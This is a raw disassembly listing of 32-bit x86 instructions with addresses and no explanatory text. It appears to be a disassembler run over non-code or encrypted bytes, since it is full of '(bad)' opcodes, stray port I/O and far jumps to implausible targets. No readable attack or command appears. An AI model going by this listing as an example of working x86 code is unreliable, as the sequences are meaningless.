  409516:	cmp    esp,esp
  409518:	fisttp QWORD PTR [esp-0x53749453]
  40951f:	dec    ebp
  409520:	retf   
  409521:	and    eax,0xbdbe53e4
  409526:	dec    eax
  409527:	or     eax,0xd8beadcf
  40952c:	push   esi
  40952d:	dec    esi
  40952e:	mov    esi,0xf1670f9
  409533:	mov    es:0x7b3fef30,eax
  409539:	dec    DWORD PTR [ebx+edx*1]
  40953c:	out    0x32,al
  40953e:	fldenv [ebx-0x4a]
  409541:	dec    eax
  409542:	mov    ah,0x35
  409544:	jle    0x40953f
  409546:	ss aam 0x3a
  409549:	pop    es
  40954a:	or     eax,0x2eacd75e
  40954f:	out    0xeb,eax
  409551:	xchg   ecx,eax
  409552:	aad    0xe4
  409554:	xchg   edi,eax
  409555:	push   ss
  409556:	stos   DWORD PTR es:[edi],eax
  409557:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  409559:	leave  
  40955a:	lds    ebx,FWORD PTR [ebx+0x17]
  40955d:	sub    al,0x17
  40955f:	jg     0x4095c7
  409561:	shr    bh,0x2c
  409564:	pop    eax
  409565:	out    dx,al
  409566:	out    dx,al
  409567:	repnz iret 
  409569:	or     BYTE PTR [ecx+0x5809a184],dl
  40956f:	out    0x52,eax
  409571:	cmp    BYTE PTR [edi+0x8],0xf1
  409575:	xchg   ebx,eax
  409576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409577:	shl    bl,cl
  409579:	sub    BYTE PTR [edi+edi*2-0x80],bl
  40957d:	shl    cl,cl
  40957f:	sbb    edi,ebx
  409581:	sbb    eax,0xabc50b41
  409586:	(bad)  
  409587:	add    BYTE PTR [edi],ah
  409589:	mov    ebp,0x277534ac
  40958e:	sti    
  40958f:	xor    DWORD PTR [ebp+esi*2-0x6b],esi
  409593:	mov    ah,0x59
  409595:	test   eax,0xbce9da26
  40959a:	pop    edx
  40959b:	popa   
  40959c:	ficomp WORD PTR [esi]
  40959e:	pop    ss
  40959f:	mov    esi,0xd7d4b0e8
  4095a4:	or     al,bl
  4095a6:	sbb    DWORD PTR [esi-0x7465b4ce],edx
  4095ac:	js     0x409606
  4095ae:	bswap  ecx
  4095b0:	mov    ch,0xdf
  4095b2:	xchg   edx,eax
  4095b3:	hlt    
  4095b4:	and    eax,0x5c3fd23b
  4095b9:	inc    ecx
  4095ba:	xchg   esp,eax
  4095bb:	pop    ss
  4095bc:	adc    cl,BYTE PTR [ebx+0x7e851b85]
  4095c2:	stc    
  4095c3:	sbb    BYTE PTR [ecx+0x20b30e7a],bh
  4095c9:	mov    bl,0x28
  4095cb:	hlt    
  4095cc:	div    BYTE PTR [edx+0x4a]
  4095cf:	dec    edx
  4095d0:	ins    DWORD PTR es:[edi],dx
  4095d1:	cmc    
  4095d2:	call   0xf254:0x79011138
  4095d9:	push   0xa266cca7
  4095de:	add    eax,0x1639884b
  4095e3:	sti    
  4095e4:	xor    BYTE PTR [edi],al
  4095e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095e7:	push   0x4ac193a4
  4095ec:	dec    edx
  4095ed:	arpl   WORD PTR [ebp+0x22],di
  4095f0:	je     0x409636
  4095f2:	(bad)  
  4095f4:	loop   0x4095c9
  4095f6:	push   ecx
  4095f7:	sub    ebx,DWORD PTR [esp+eax*1+0x62]
  4095fb:	sti    
  4095fc:	inc    esp
  4095fd:	jnp    0x4095a9
  4095ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409600:	call   0x889bdfb3
  409605:	ret    
  409606:	adc    eax,0x55de465f
  40960b:	mov    ch,0x62
  40960d:	xor    eax,0xbde8d179
  409612:	pop    edx
  409613:	inc    esp
  409614:	sahf   
  409615:	inc    edx
  409616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409618:	fadd   QWORD PTR [esi-0x1f5dd3ae]
  40961e:	mov    WORD PTR [ebp-0x29],gs
  409621:	push   0xffffffb3
  409623:	cwde   
  409624:	or     ebp,DWORD PTR [ebp-0x73332e14]
  40962a:	dec    esi
  40962b:	inc    edi
  40962c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40962d:	cdq    
  40962e:	(bad)  
  40962f:	pop    ecx
  409630:	add    BYTE PTR [esi-0x72a30ca6],0x15
  409637:	jmp    0x59ecc299
  40963c:	in     al,0x3a
  40963e:	icebp  
  40963f:	sbb    cl,BYTE PTR [edx]
  409641:	cmp    DWORD PTR cs:[ebx+0x3419f0d2],ebx
  409648:	push   es
  409649:	push   edi
  40964a:	cmp    eax,0x56474e1d
  40964f:	add    esi,DWORD PTR [ecx]
  409651:	sti    
  409652:	fisttp DWORD PTR [eax]
  409654:	xrelease xchg DWORD PTR [esi],ebp
  409657:	es pop eax
  409659:	and    BYTE PTR [ecx],0x14
  40965c:	pop    esp
  40965d:	sbb    edi,esp
  40965f:	or     ebp,DWORD PTR [ebx+0x1]
  409662:	mov    ?,WORD PTR [edi+0x6444398]
  409668:	sbb    esp,DWORD PTR [ecx]
  40966a:	and    dl,bl
  40966c:	xor    DWORD PTR [edx-0x3d],eax
  40966f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409670:	sub    al,dh
  409672:	dec    ecx
  409673:	pop    ds
  409674:	adc    eax,0x232470c9
  409679:	mov    fs,WORD PTR [ebx]
  40967b:	cmp    al,0x84
  40967d:	call   0xf912:0xe0427bda
  409684:	xchg   esi,eax
  409685:	add    DWORD PTR [ecx-0x4835c427],esi
  40968b:	ja     0x409635
  40968d:	and    DWORD PTR [ebx-0x34],esi
  409690:	cwde   
  409691:	rcr    BYTE PTR [ecx+0x409967f],cl
  409697:	daa    
  409698:	and    BYTE PTR [ecx+eax*2],bl
  40969b:	out    0x86,al
  40969d:	adc    al,0x89
  40969f:	sub    ecx,ecx
  4096a1:	sbb    DWORD PTR [ebx+0x73c1ab59],eax
  4096a7:	scas   eax,DWORD PTR es:[edi]
  4096a8:	sbb    bl,dl
  4096aa:	(bad)  
  4096ab:	popa   
  4096ac:	aaa    
  4096ad:	push   edi
  4096ae:	fstp   TBYTE PTR [eax-0x7d]
  4096b1:	and    ch,BYTE PTR [edi]
  4096b3:	or     esi,ecx
  4096b5:	imul   esp,ebp,0xabc86653
  4096bb:	jmp    0xc993:0xeddb1421
  4096c2:	and    edi,DWORD PTR [edx+0x2]
  4096c5:	scas   al,BYTE PTR es:[edi]
  4096c6:	xchg   esi,eax
  4096c7:	mov    dl,0x8a
  4096c9:	stos   BYTE PTR es:[edi],al
  4096ca:	jmp    0xd075eaa3
  4096cf:	pop    edx
  4096d0:	outs   dx,DWORD PTR ds:[esi]
  4096d1:	(bad)  
  4096d2:	push   cs
  4096d3:	xchg   ebp,eax
  4096d4:	js     0x409697
  4096d6:	jmp    0xb27ba8e7
  4096db:	mov    cl,0x25
  4096dd:	jmp    0x133b49f4
  4096e2:	sub    eax,0x504389be
  4096e7:	push   ds
  4096e8:	hlt    
  4096e9:	cld    
  4096ea:	(bad)
  4096ed:	lock retf 0xa975
  4096f1:	nop
  4096f2:	add    al,0xf8
  4096f4:	xor    al,0x4e
  4096f6:	imul   ecx,DWORD PTR [esi],0xaad85f5b
  4096fc:	push   edi
  4096fd:	out    0x1e,al
  4096ff:	add    bh,bh
  409701:	popf   
  409702:	aaa    
  409703:	pusha  
  409704:	inc    ebp
  409705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409706:	sub    DWORD PTR [ebx],eax
  409708:	loope  0x40971b
  40970a:	fcomi  st,st(2)
  40970c:	sub    BYTE PTR [edx+edx*2+0x77309630],0x2c
  409714:	ja     0x4096f2
  409716:	les    ecx,FWORD PTR [ebp-0x5db6b434]
  40971c:	cmp    eax,0xe8e9cd12
  409721:	mov    ebp,ecx
  409723:	xor    eax,0xabb36d82
  409728:	cmp    eax,0x501fafff
  40972d:	sar    ecx,0xa0
  409730:	ret    
  409731:	and    esp,edx
  409733:	sbb    eax,0x12d74055
  409738:	pop    es
  409739:	inc    ebx
  40973a:	scas   al,BYTE PTR es:[edi]
  40973b:	sbb    bl,ch
  40973d:	iret   
  40973e:	adc    ebp,DWORD PTR [esi]
  409740:	push   ecx
  409741:	pusha  
  409742:	popa   
  409743:	xor    BYTE PTR [edx-0x6c03d5f3],bh
  409749:	and    ebx,0xffffff8d
  40974c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40974d:	imul   ebp,DWORD PTR [edx+0x36],0x4d
  409751:	xor    al,0x43
  409753:	mov    edx,0x5da2720b
  409758:	test   eax,0xbe98f38d
  40975d:	dec    ebp
  40975e:	cmp    DWORD PTR [esi-0x7bb8af61],esi
  409764:	ja     0x409733
  409766:	jge    0x4097e0
  409768:	int3   
  409769:	sbb    bh,BYTE PTR [edi-0x63]
  40976c:	inc    ecx
  40976d:	inc    edx
  40976e:	mov    al,ds:0xda70d87e
  409773:	dec    ecx
  409774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409775:	push   edx
  409776:	adc    eax,0x5c0bfa8d
  40977b:	push   esp
  40977c:	das    
  40977d:	rcl    DWORD PTR [eax+0x1c],cl
  409780:	xor    al,0x74
  409782:	pop    ebx
  409783:	aam    0x3a
  409785:	cmp    eax,0xf5110835
  40978a:	jae    0x4097d1
  40978c:	mov    BYTE PTR [eax],cl
  40978e:	ins    BYTE PTR es:[edi],dx
  40978f:	lods   eax,DWORD PTR ds:[esi]
  409790:	mov    DWORD PTR [ecx],eax
  409792:	(bad)  
  409793:	and    al,0xc5
  409795:	xchg   esi,eax
  409796:	shl    DWORD PTR [ecx-0x13],cl
  409799:	and    bl,BYTE PTR [edi-0x62]
  40979c:	adc    BYTE PTR [edx-0x33],dh
  40979f:	jl     0x40980f
  4097a1:	les    ecx,FWORD PTR [ebx+0x2a9327db]
  4097a7:	dec    ecx
  4097a8:	dec    eax
  4097a9:	or     eax,0x6fe95997
  4097ae:	sub    ebp,ebx
  4097b0:	mov    esp,?
  4097b2:	xor    ebx,ecx
  4097b4:	fldenv [esi+ecx*1]
  4097b7:	mov    BYTE PTR [edx+edi*4-0x2],cl
  4097bb:	inc    edi
  4097bc:	push   ecx
  4097bd:	aad    0x2e
  4097bf:	mov    bh,0x6
  4097c1:	test   BYTE PTR [edi-0x14],dh
  4097c4:	adc    DWORD PTR [edx+0x2f],eax
  4097c7:	fld    QWORD PTR [ebx+0x1e]
  4097ca:	add    edx,0x49788c3d
  4097d0:	mov    al,ds:0x26f5fdea
  4097d5:	retf   0x18f2
  4097d8:	ss leave 
  4097da:	inc    eax
  4097dc:	sub    bl,BYTE PTR [edx]
  4097de:	sub    BYTE PTR [esi-0x6efd57b1],bh
  4097e4:	add    DWORD PTR [edx-0x74],eax
  4097e7:	fisttp WORD PTR [ebp+ebp*1-0x329db397]
  4097ee:	jbe    0x4097ad
  4097f0:	dec    esi
  4097f1:	mov    eax,ds:0x2245472c
  4097f6:	mov    esi,0x599f1d4d
  4097fb:	iret   
  4097fc:	arpl   WORD PTR [esp+edx*1+0x7e],si
  409800:	pusha  
  409801:	jp     0x40980a
  409803:	adc    al,al
  409805:	test   DWORD PTR ds:0x83c7c22,esp
  40980b:	outs   dx,BYTE PTR ds:[esi]
  40980c:	jmp    DWORD PTR [eax]
  40980e:	xchg   edi,eax
  40980f:	mov    ah,0x3a
  409811:	jbe    0x4097a4
  409813:	pop    es
  409814:	pop    edi
  409815:	mov    WORD PTR [edx-0x5d31a2ce],gs
  40981b:	not    BYTE PTR [ecx-0x6f]
  40981e:	or     DWORD PTR [edx],edx
  409820:	pop    esp
  409821:	dec    ebp
  409822:	jo     0x409841
  409824:	mov    ss,WORD PTR [esi-0x3fc2aa06]
  40982a:	retf   
  40982b:	mov    bh,0xa6
  40982d:	xor    ah,ah
  40982f:	or     BYTE PTR ds:0xd5ecfdb0,0xc3
  409836:	dec    esp
  409837:	adc    eax,0x314b1022
  40983c:	mov    edx,0xe22f8428
  409841:	add    edi,ebp
  409843:	xchg   edi,eax
  409844:	inc    eax
  409845:	or     al,0xc4
  409847:	cmc    
  409848:	push   ss
  409849:	adc    DWORD PTR [ecx-0x1d],ecx
  40984c:	jne    0x4098c1
  40984e:	inc    eax
  40984f:	cmp    edi,DWORD PTR [esi+0x4383c111]
  409855:	pop    esp
  409856:	jmp    0xdc:0x713cefa
  40985d:	es push ds
  40985f:	inc    eax
  409860:	jle    0x409852
  409862:	and    bl,BYTE PTR [edx+eax*4-0x4ab46ed6]
  409869:	push   ebp
  40986a:	sub    BYTE PTR [ecx],bl
  40986c:	dec    esi
  40986d:	xchg   esp,eax
  40986e:	inc    esp
  40986f:	pop    ecx
  409870:	pop    ss
  409871:	pop    edx
  409872:	mov    esp,0xc0e5985a
  409877:	ror    DWORD PTR [edx+0x48],cl
  40987a:	iret   
  40987b:	(bad)  
  40987c:	arpl   WORD PTR [esi+edx*8+0x33],bp
  409880:	pop    ds
  409881:	mov    eax,0x3c584dd4
  409886:	push   eax
  409887:	jl     0x4098ff
  409889:	hlt    
  40988a:	pop    edx
  40988b:	lods   eax,DWORD PTR ds:[esi]
  40988c:	loopne 0x4098be
  40988e:	rcr    BYTE PTR [ebx+ecx*2+0x37],1
  409892:	cld    
  409893:	mov    cl,0xf7
  409895:	xchg   edx,eax
  409896:	sbb    dh,BYTE PTR [edi-0x79]
  409899:	push   eax
  40989a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40989b:	inc    ecx
  40989c:	fsubr  QWORD PTR [edi+ebp*1]
  40989f:	and    ecx,DWORD PTR [ecx]
  4098a1:	adc    al,0xde
  4098a3:	neg    BYTE PTR [eax-0x228e1957]
  4098a9:	sub    BYTE PTR [edx],bl
  4098ab:	push   esp
  4098ac:	sti    
  4098ad:	inc    esi
  4098ae:	sbb    esi,DWORD PTR [ebp+0x3b]
  4098b1:	stc    
  4098b2:	test   DWORD PTR [edx],0x743fa4f
  4098b8:	mov    ecx,DWORD PTR [edi]
  4098ba:	push   es
  4098bb:	dec    DWORD PTR [edx]
  4098bd:	cmp    eax,0xb1aaaa4f
  4098c2:	fistp  WORD PTR [ecx-0x5c423b22]
  4098c8:	lock sub DWORD PTR [edi-0x6],ebp
  4098cc:	test   BYTE PTR [ecx-0xf],0xdd
  4098d0:	mov    ebx,0x605b75f5
  4098d5:	mov    edx,0xf42f7dd1
  4098da:	or     edi,DWORD PTR [ecx]
  4098dc:	add    ch,BYTE PTR [esi]
  4098de:	sub    al,0xa9
  4098e0:	jmp    0x409878
  4098e2:	pop    ds
  4098e3:	sti    
  4098e4:	mov    ebp,0xa9fcd0b0
  4098e9:	lock int 0x38
  4098ec:	stos   BYTE PTR es:[edi],al
  4098ed:	inc    ebp
  4098ee:	dec    esi
  4098ef:	enter  0x2cd5,0xaf
  4098f3:	fst    QWORD PTR [edi+eax*1]
  4098f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098f7:	loop   0x40995c
  4098f9:	push   esi
  4098fa:	outs   dx,DWORD PTR ds:[esi]
  4098fb:	cmp    ecx,DWORD PTR [ebp-0x50]
  4098fe:	mov    gs:0xc6db0670,al
  409904:	test   BYTE PTR [ebx-0x1e060da1],dl
  40990a:	xor    BYTE PTR [edi+0x1c1e2755],bl
  409910:	add    ebx,DWORD PTR [edi+0x645c27e4]
  409916:	mov    BYTE PTR [ecx],dh
  409918:	dec    edi
  409919:	cmc    
  40991a:	mov    BYTE PTR [ecx+0x79],ch
  40991d:	pop    ebp
  40991e:	inc    edi
  40991f:	lahf   
  409920:	sahf   
  409921:	jbe    0x409952
  409923:	fiadd  DWORD PTR [ebx+eiz*8+0x28]
  409927:	(bad)  
  409928:	pop    esp
  409929:	inc    esi
  40992a:	jle    0x409914
  40992c:	inc    ebx
  40992d:	ror    DWORD PTR [esi-0x52e4cf4e],cl
  409933:	pop    ss
  409934:	inc    ecx
  409935:	mov    bh,0xfb
  409937:	push   edi
  409938:	mov    edi,0x6d946c48
  40993d:	aas    
  40993e:	xchg   esi,eax
  40993f:	sub    edx,DWORD PTR [ecx]
  409941:	mov    al,ds:0xf8db0cf
  409946:	retf   0x26e4
  409949:	jb     0x409996
  40994b:	push   ebp
  40994c:	push   0xed87b1a4
  409951:	arpl   WORD PTR [edi-0x13a932fc],ax
  409957:	inc    ebx
  409958:	rol    DWORD PTR [edi-0x5da5a5f9],1
  40995e:	out    dx,al
  40995f:	(bad)  
  409960:	imul   esi,DWORD PTR [ecx+0x5d],0xf41acaf2
  409967:	outs   dx,BYTE PTR ds:[esi]
  409968:	lods   al,BYTE PTR ds:[esi]
  409969:	fwait
  40996a:	pop    ds
  40996b:	cs and al,0x64
  40996e:	fnstsw WORD PTR [ebp-0x3aa45c26]
  409974:	jno    0x409981
  409976:	aas    
  409977:	xor    edi,ecx
  409979:	cmp    ebp,DWORD PTR [esi-0x69]
  40997c:	push   ebx
  40997d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40997e:	mov    eax,0x900901f7
  409983:	and    dl,BYTE PTR [eax+ebp*4]
  409986:	dec    esi
  409987:	inc    edx
  409988:	cmp    eax,0x1ff5793e
  40998d:	cli    
  40998e:	mov    cl,0xac
  409990:	jne    0x409926
  409992:	les    ecx,FWORD PTR [esi-0xe]
  409995:	cmp    ch,BYTE PTR [ecx]
  409997:	rcr    BYTE PTR [ecx+edx*4-0x11ce5586],1
  40999e:	sub    al,0x36
  4099a0:	xor    ch,BYTE PTR [edi+esi*1]
  4099a3:	jg     0x40997a
  4099a5:	nop
  4099a6:	pushf  
  4099a7:	jns    0x40992a
  4099a9:	call   0x9e66:0x904510c4
  4099b0:	mov    ebx,0xf7aa0b01
  4099b5:	pop    ebx
  4099b6:	mov    edi,0x90c9657b
  4099bb:	push   ss
  4099bc:	clc    
  4099bd:	outs   dx,DWORD PTR ds:[esi]
  4099be:	(bad)  
  4099bf:	cdq    
  4099c0:	outs   dx,BYTE PTR ds:[esi]
  4099c1:	not    BYTE PTR [ecx+0x7275d665]
  4099c7:	mov    al,0xa7
  4099c9:	out    dx,al
  4099ca:	pop    es
  4099cb:	add    cl,BYTE PTR ds:0x91e98b9f
  4099d1:	aad    0x78
  4099d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099d4:	dec    ebx
  4099d5:	(bad)
  4099d9:	stos   BYTE PTR es:[edi],al
  4099da:	dec    edi
  4099db:	fsubr  st(4),st
  4099dd:	lods   al,BYTE PTR ds:[esi]
  4099de:	push   eax
  4099df:	push   cs
  4099e0:	sbb    eax,0xf5fa32a1
  4099e5:	sbb    edi,0xe54578d0
  4099eb:	or     DWORD PTR [edi-0x3b],ecx
  4099ee:	xlat   BYTE PTR ds:[ebx]
  4099ef:	adc    bl,0xab
  4099f2:	(bad)  
  4099f3:	sub    BYTE PTR [ecx+0x4f],ah
  4099f6:	sti    
  4099f7:	inc    ebx
  4099f8:	call   0xc8ef63ed
  4099fd:	clc    
  4099fe:	sub    al,bl
  409a00:	fwait
  409a01:	shrd   DWORD PTR [edi+0x6f9f649f],edx,0x7
  409a09:	cs cmc 
  409a0b:	fcom   st(0)
  409a0d:	call   0xa7774ed7
  409a12:	stc    
  409a13:	mov    cl,0x64
  409a15:	out    dx,eax
  409a16:	cmp    DWORD PTR [ebx-0x53],ebp
  409a19:	dec    edi
  409a1a:	(bad)  
  409a1b:	stc    
  409a1c:	gs nop
  409a1e:	test   DWORD PTR [eax-0x10],0xa8799bd1
  409a25:	adc    ch,BYTE PTR [esi+0x36137dca]
  409a2b:	cli    
  409a2c:	push   ss
  409a2d:	jno    0x4099bf
  409a2f:	aaa    
  409a30:	add    al,0x49
  409a32:	inc    ecx
  409a33:	(bad)  [esi+0x7b702161]
  409a39:	js     0x409a8c
  409a3b:	xor    ebp,esp
  409a3d:	aad    0xe0
  409a3f:	call   0x862e:0xb9bc5b
  409a46:	and    DWORD PTR [edx-0x40],ebx
  409a49:	push   edx
  409a4a:	hlt    
  409a4b:	sar    BYTE PTR [edx-0x3cb24667],0x27
  409a52:	(bad)  
  409a53:	popa   
  409a54:	xlat   BYTE PTR ds:[ebx]
  409a55:	inc    edx
  409a56:	push   esp
  409a57:	enter  0x4f01,0x36
  409a5b:	retf   0x2ee0
  409a5e:	xor    edx,ecx
  409a60:	xchg   edi,eax
  409a61:	add    DWORD PTR [ebx+0x3e],edi
  409a64:	xchg   ebp,eax
  409a65:	jmp    0x409ab2
  409a67:	test   eax,0x7a479144
  409a6c:	popa   
  409a6d:	icebp  
  409a6e:	pop    ebx
  409a6f:	mov    cl,0xd
  409a71:	sbb    edi,DWORD PTR [ebp-0x8]
  409a74:	sbb    ebp,eax
  409a76:	outs   dx,DWORD PTR ds:[esi]
  409a77:	push   ecx
  409a78:	scas   eax,DWORD PTR es:[edi]
  409a79:	not    ebx
  409a7b:	fsubr  st(5),st
  409a7d:	int3   
  409a7e:	jno    0x409abd
  409a80:	ins    BYTE PTR es:[edi],dx
  409a81:	mov    al,ds:0xa6d041af
  409a86:	clc    
  409a87:	ja     0x409a8e
  409a89:	and    DWORD PTR [edx+0x1eab2a5a],ebp
  409a8f:	xchg   ecx,ebx
  409a91:	add    ecx,ebx
  409a93:	popf   
  409a94:	dec    DWORD PTR [eax+ebp*2]
  409a97:	pop    esi
  409a98:	inc    ecx
  409a99:	and    DWORD PTR [edi+eax*4-0x3b13302e],edi
  409aa0:	push   0xffffffc3
  409aa2:	push   eax
  409aa3:	das    
  409aa4:	popa   
  409aa5:	inc    eax
  409aa6:	cmp    ah,BYTE PTR [ebp+0x17]
  409aa9:	xchg   esi,eax
  409aaa:	cmp    BYTE PTR [ebx+0x3c69dff4],ch
  409ab0:	test   edi,edx
  409ab2:	pop    ebx
  409ab3:	push   edi
  409ab5:	test   BYTE PTR [eax+0x7c],bl
  409ab8:	cs hlt 
  409aba:	xchg   ebp,eax
  409abb:	std    
  409abc:	(bad)  
  409abf:	dec    ecx
  409ac0:	inc    ebx
  409ac1:	sbb    ecx,esp
  409ac3:	out    0x88,al
  409ac5:	sub    eax,0xcdb3ce51
  409aca:	ror    BYTE PTR [eax],cl
  409acc:	push   ebx
  409acd:	push   0xffffffc8
  409acf:	test   BYTE PTR [ebp-0x143060b4],al
  409ad5:	mov    esp,0xf155eb
  409ada:	out    0xc3,al
  409adc:	mov    ch,cl
  409ade:	add    al,0x3f
  409ae0:	gs dec edi
  409ae2:	and    ah,BYTE PTR [edx]
  409ae4:	mov    BYTE PTR [ebx-0x2d5bc973],ch
  409aea:	out    0x1a,eax
  409aec:	and    al,0xa0
  409aee:	sbb    BYTE PTR [ebp-0x692b73f1],ch
  409af4:	(bad)  
  409af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409af6:	mov    eax,0xe6b253ff
  409afb:	bound  esi,QWORD PTR [esi+0x6a]
  409afe:	call   0x9f1da8d4
  409b03:	inc    edx
  409b04:	jge    0x409a86
  409b06:	mov    ebp,0xa15a2efe
  409b0b:	out    dx,al
  409b0c:	imul   esp,DWORD PTR [edx+0x6d],0xde870e76
  409b13:	pushf  
  409b14:	aam    0xfc
  409b16:	cmp    ebp,edx
  409b18:	das    
  409b19:	xchg   edx,eax
  409b1a:	and    eax,0x614878e2
  409b1f:	lea    ebp,[eax]
  409b21:	add    al,0xed
  409b23:	repnz aas 
  409b25:	inc    ebx
  409b26:	jno    0x409b68
  409b28:	xor    DWORD PTR [esi-0x73],ebx
  409b2b:	loope  0x409ad5
  409b2d:	add    DWORD PTR [edx+0x15],0x4e367d1c
  409b34:	cmp    BYTE PTR [ebx-0xbdc5e47],ah
  409b3a:	inc    edi
  409b3b:	mov    ebx,0xf6e62ff6
  409b40:	fwait
  409b41:	pop    ebx
  409b42:	mov    ebx,0x43ca1d46
  409b47:	leave  
  409b48:	cs inc ebx
  409b4a:	mov    bh,0x3b
  409b4c:	push   DWORD PTR [eax+ecx*8]
  409b4f:	pop    ds
  409b50:	or     BYTE PTR [eax+0x6c],0xe3
  409b54:	jecxz  0x409b89
  409b56:	test   al,0x68
  409b58:	mov    ds:0x95104786,al
  409b5d:	lods   al,BYTE PTR ds:[esi]
  409b5e:	sbb    DWORD PTR [ebp-0x77d89fa5],ebp
  409b64:	mov    al,ds:0x33ca155b
  409b69:	sub    BYTE PTR [ebp-0x1de7ff9e],al
  409b6f:	push   edi
  409b70:	fnstcw WORD PTR [eax]
  409b72:	stc    
  409b73:	imul   esi,DWORD PTR ds:0xffe4f870,0x8e0581d2
  409b7d:	mov    al,0x78
  409b7f:	nop    DWORD PTR [eax-0x53]
  409b83:	add    DWORD PTR [edx+0x7dd65ca4],0xffffff90
  409b8a:	dec    ecx
  409b8b:	dec    eax
  409b8c:	push   eax
  409b8d:	cmp    edi,DWORD PTR [edi+0x12]
  409b90:	dec    edx
  409b91:	das    
  409b92:	icebp  
  409b93:	inc    ebx
  409b94:	and    BYTE PTR [edi-0x25a5a501],bl
  409b9a:	imul   eax,DWORD PTR [ecx],0xe68b02f8
  409ba0:	xor    eax,0x3e427bc
  409ba5:	mov    esi,edi
  409ba7:	fcom   DWORD PTR [edx]
  409ba9:	jnp    0x409b34
  409bab:	mov    dh,0x3d
  409bad:	push   edi
  409bae:	pop    ebp
  409baf:	retf   0xef4e
  409bb2:	mov    ebp,0x45a3ab18
  409bb7:	into   
  409bb8:	adc    ebp,edi
  409bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bbb:	cli    
  409bbc:	jno    0x409bec
  409bbe:	jle    0x409bb2
  409bc0:	das    
  409bc1:	dec    edi
  409bc2:	push   esi
  409bc3:	jns    0x409b84
  409bc5:	inc    ebx
  409bc6:	add    DWORD PTR [edi],eax
  409bc8:	cli    
  409bc9:	mov    ebp,0x3346efc1
  409bce:	adc    DWORD PTR [edx],esi
  409bd0:	sbb    edx,DWORD PTR [ebp+0x66]
  409bd3:	neg    DWORD PTR [edx-0x7f]
  409bd6:	inc    edx
  409bd7:	fist   DWORD PTR [edi]
  409bd9:	push   0x3d
  409bdb:	mov    ah,0x93
  409bdd:	adc    al,0xfa
  409bdf:	(bad)  
  409be2:	mov    ebp,0x8b415d8b
  409be7:	jl     0x409b7f
  409be9:	loope  0x409c61
  409beb:	jge    0x409bf6
  409bed:	in     eax,0x88
  409bef:	and    DWORD PTR [edx-0x73],edx
  409bf2:	cdq    
  409bf3:	test   al,0xf6
  409bf5:	mov    ?,esi
  409bf7:	add    ecx,0x4
  409bfa:	sti    
  409bfb:	mov    esi,0xbe768bd9
  409c00:	jl     0x409bec
  409c02:	add    ebx,DWORD PTR [ebx+0x47]
  409c05:	adc    BYTE PTR [esi],dl
  409c07:	add    BYTE PTR [edi+0x33],cl
  409c0a:	pop    esp
  409c0b:	xor    BYTE PTR [edi],cl
  409c0d:	cmp    DWORD PTR [bx],edx
  409c10:	adc    DWORD PTR [eax],ecx
  409c12:	lea    ebp,[ebx]
  409c14:	call   0x7ca3:0xf8aaea76
  409c1b:	cdq    
  409c1c:	stc    
  409c1d:	xor    esp,edx
  409c1f:	or     al,0x11
  409c21:	push   ebp
  409c22:	sub    DWORD PTR [ecx-0x1e],edi
  409c25:	daa    
  409c26:	outs   dx,DWORD PTR ds:[si]
  409c28:	call   FWORD PTR [edx]
  409c2a:	mov    cl,BYTE PTR [edi+0xc9da0e1]
  409c30:	test   eax,0xc8381448
  409c35:	shr    BYTE PTR [edi-0x38],1
  409c38:	push   eax
  409c39:	jmp    0x63a26c8
  409c3e:	push   esi
  409c3f:	fistp  WORD PTR [eax-0x2629c465]
  409c45:	cmp    edx,DWORD PTR [ecx-0x2d6b9e0e]
  409c4b:	popf   
  409c4c:	sbb    edx,DWORD PTR [ecx+0x34]
  409c4f:	lea    esp,[esi-0x3f]
  409c52:	xor    ecx,DWORD PTR [edi-0x5073fdc0]
  409c58:	cmp    si,WORD PTR [edi+edi*4]
  409c5c:	mov    eax,ds:0x1bd8ec2f
  409c61:	sbb    esi,ebp
  409c63:	mul    DWORD PTR [ecx]
  409c65:	popf   
  409c66:	mov    esi,0xbde49e3a
  409c6b:	inc    ecx
  409c6c:	inc    esp
  409c6d:	outs   dx,DWORD PTR ds:[esi]
  409c6e:	shl    DWORD PTR [edi-0x21],cl
  409c71:	dec    eax
  409c72:	mov    eax,ds:0x8ba3a592
  409c77:	iret   
  409c78:	daa    
  409c79:	xchg   ebp,eax
  409c7a:	aas    
  409c7b:	(bad)  
  409c7d:	rcr    ecx,cl
  409c7f:	mov    al,ds:0xe1c00456
  409c84:	pop    es
  409c85:	cli    
  409c86:	mov    al,ah
  409c88:	pop    es
  409c89:	cmp    al,0x3d
  409c8b:	outs   dx,BYTE PTR ds:[esi]
  409c8c:	and    BYTE PTR [ebx],bl
  409c8e:	adc    BYTE PTR ds:0xdabfaee0,ah
  409c94:	xor    BYTE PTR [esi],bh
  409c96:	pop    edi
  409c97:	mov    bh,BYTE PTR [ecx-0x6c]
  409c9a:	fldcw  WORD PTR [esi+0x47]
  409c9d:	or     edi,edx
  409c9f:	xor    BYTE PTR [eax+0x53],cl
  409ca2:	fwait
  409ca3:	ins    DWORD PTR es:[edi],dx
  409ca4:	sbb    bh,BYTE PTR [ebp-0x4]
  409ca7:	adc    ah,BYTE PTR [edi+edi*2+0x3874f7ac]
  409cae:	mov    dh,0xca
  409cb0:	jmp    0x409c87
  409cb2:	ret    0x168c
  409cb5:	and    bh,dl
  409cb7:	call   0xe6324cc6
  409cbc:	dec    ebp
  409cbd:	xchg   edi,eax
  409cbe:	push   esp
  409cbf:	das    
  409cc0:	push   eax
  409cc1:	mov    ds:0xa561e477,eax
  409cc6:	loope  0x409c83
  409cc8:	push   0xc27c138e
  409ccd:	fstp   st(4)
